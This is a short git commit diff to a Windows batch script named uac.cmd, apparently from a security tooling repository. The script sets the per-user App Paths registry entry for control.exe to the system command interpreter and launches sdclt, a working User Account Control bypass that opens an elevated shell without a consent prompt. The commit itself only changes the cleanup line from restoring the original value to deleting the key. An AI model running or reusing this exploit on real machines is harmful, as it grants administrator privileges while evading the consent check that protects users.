4b40462194502063e3924ff7e9719cc888d477d8
Aaron Lewis <the.warl0ck.1989@gmail.com>
2017-03-16 22:14:26 +0800

    Update uac.cmd

--- uac.cmd
+++ uac.cmd
@@ -2,5 +2,5 @@
 
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /t REG_SZ /d %COMSPEC% /f
 sdclt
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /t REG_SZ /d %systemroot%\system32\control.exe /f
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /f
 
